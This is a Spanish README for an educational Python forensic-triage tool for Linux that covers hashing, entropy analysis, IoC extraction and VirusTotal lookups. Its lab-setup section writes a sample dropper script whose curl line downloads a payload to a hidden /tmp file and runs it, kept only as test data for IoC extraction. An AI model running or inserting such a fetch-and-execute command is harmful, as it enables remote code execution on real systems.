# Linux Forensic Triage & Chain of Custody Tool

Herramienta de línea de comandos (CLI) desarrollada en **Python** para automatizar el triaje forense inicial, la preservación de integridad (cadena de custodia) y el análisis estático de artefactos en entornos **Linux**.

> **Aviso:** Proyecto desarrollado con fines educativos y de laboratorio. No sustituye una herramienta forense certificada ni un procedimiento legal formal de adquisición de evidencia.

---

## Capacidades Principales

- **Cadena de custodia automatizada:** Cálculo simultáneo de hashes **MD5** y **SHA-256** por bloques para archivos sospechosos y salidas de comandos del sistema.
- **Recolección de telemetría volátil:** Captura de sockets de red activos (`ss -tunap`) y procesos en ejecución (`ps aux`) con marca de tiempo UTC y sellado de integridad.
- **Análisis estático y entropía de Shannon:** Detección de artefactos posiblemente cifrados o empaquetados (entropía >= 7.5) y extracción de IoCs de red (URLs e IPs) mediante expresiones regulares.
- **Enriquecimiento con Threat Intelligence:** Integración opcional con la API v3 de **VirusTotal** (`--vt-key` o variable de entorno `VT_API_KEY`).
- **Reportes estructurados:** Exportación en **Markdown** (acta legible) y **JSON** (apto para integrarse con herramientas SIEM/SOAR).

---

## Estructura del Proyecto

```text
linux-forensic-triage/
├── forensic_triage.py   # Script principal (CLI)
├── evidencia/           # Artefactos de prueba para validación
├── reportes/            # Reportes generados (triage_report.md / .json)
├── docs/                # Capturas de evidencia de ejecución
├── LICENSE
└── README.md
```

---

## Requisitos

- Sistema operativo Linux (probado en Kali Linux)
- Python 3.8 o superior
- Librería Python `requests` (opcional, solo necesaria para consultas a VirusTotal)
- Utilidades estándar del sistema: `ss` (paquete `iproute2`) y `ps` (paquete `procps`)
- Opcional: API key de VirusTotal (la versión gratuita admite hasta 4 consultas por minuto)

---

## Uso y Reproducción en Laboratorio

### 1. Generación de artefactos de prueba

Para validar el cálculo de entropía y la extracción de IoCs **sin utilizar malware real**, se puede preparar un entorno de prueba aislado:

```bash
mkdir -p evidencia reportes
cat << 'EOF' > evidencia/update_cron.sh
#!/bin/bash
curl -s http://203.0.113.50/payload.bin -o /tmp/.sysd && chmod +x /tmp/.sysd && /tmp/.sysd
EOF
head -c 51200 /dev/urandom > evidencia/blob_cifrado.bin
```

**Notas sobre los archivos de prueba:**

- `update_cron.sh` **nunca se ejecuta**: solo se guarda como texto plano para simular un script descargador (*dropper*) y comprobar que las expresiones regulares extraen la URL y la IP.
- La IP `203.0.113.50` pertenece a un rango reservado para documentación, por lo que no apunta a infraestructura real.
- `blob_cifrado.bin` contiene bytes aleatorios generados localmente; su entropía (~7.99) simula un archivo cifrado o empaquetado.

### 2. Ejecución del triaje forense

```bash
# Ejecución estándar (triaje local y cadena de custodia)
python3 forensic_triage.py -d evidencia

# Ejecución con consulta a VirusTotal (recomendado mediante variable de entorno)
export VT_API_KEY="TU_API_KEY"
python3 forensic_triage.py -d evidencia
```

> **Buena práctica:** Es preferible usar la variable de entorno `VT_API_KEY` en lugar del argumento `--vt-key`, para que la clave no quede guardada en el historial de la terminal ni visible en la lista de procesos.

---

## Evidencia de Ejecución

El reporte generado (`reportes/triage_report.md`) incluye:

1. Fecha y hora de adquisición en UTC, nombre del host y directorio analizado.
2. Tabla de artefactos con tamaño, entropía, SHA-256 (MD5 incluido en la salida JSON) y evaluación preliminar.
3. Indicadores de Compromiso (IoCs) extraídos (URLs e IPs).
4. Registro de la telemetría volátil (`ss -tunap` y `ps aux`) con su hash SHA-256.

Por ejemplo, un archivo con entropía **7.9961** se clasifica como `ALTA ENTROPÍA (Posible cifrado/empaquetado)`.

## Evidencia de Ejecución y Cadena de Custodia
<img width="1027" height="456" alt="Captura de pantalla 2026-11-23 214808" src="https://github.com/user-attachments/assets/53a6a11e-e8ef-4925-8738-8a06b96a6fd1" />

---

## Criterios Técnicos Aplicados

- **Integridad y trazabilidad:** Cada evidencia y salida de comando se sella con SHA-256 (y MD5 por compatibilidad con bases de datos externas), y todas las marcas de tiempo se registran en **UTC**.
- **Interpretación de la entropía de Shannon:** Mide la aleatoriedad de los bytes de un archivo en una escala de 0 a 8:

| Rango | Interpretación habitual |
|-------|-------------------------|
| 0.0 - 5.0 | Texto plano, scripts y código fuente |
| 5.0 - 7.5 | Binarios ejecutables estándar |
| >= 7.5 | Posible cifrado, empaquetado u ofuscación |

*Nota:* El umbral de 7.5 es un indicador inicial de triaje, no un veredicto. Archivos legítimos comprimidos (`.zip`, `.gz`, `.jpg`, `.mp4`, `.docx`) también presentan valores altos, por lo que todo resultado debe validarse con análisis adicional.

---

## Limitaciones

- Realiza triaje rápido de archivos y del estado actual del sistema; no efectúa volcado de memoria RAM ni clonado forense de discos.
- La extracción de IoCs con expresiones regulares detecta cadenas en texto claro, pero no direcciones codificadas (por ejemplo, Base64) ni construidas dinámicamente.
- La integración con VirusTotal envía el hash SHA-256 del archivo a un servicio externo, por lo que no debe usarse con información confidencial sin autorización previa.
- La cadena de custodia es técnica (integridad por hash); no reemplaza el registro documental de un proceso forense formal.

---

## Mejoras Futuras

- [ ] Registrar el ID de caso y el nombre del analista en el encabezado del reporte.
- [ ] Agregar escaneo básico con reglas **YARA** locales.
- [ ] Incorporar pruebas unitarias para el cálculo de entropía y las expresiones regulares.

---

## Licencia

Distribuido bajo la licencia MIT. Consultar el archivo `LICENSE` para más detalles.


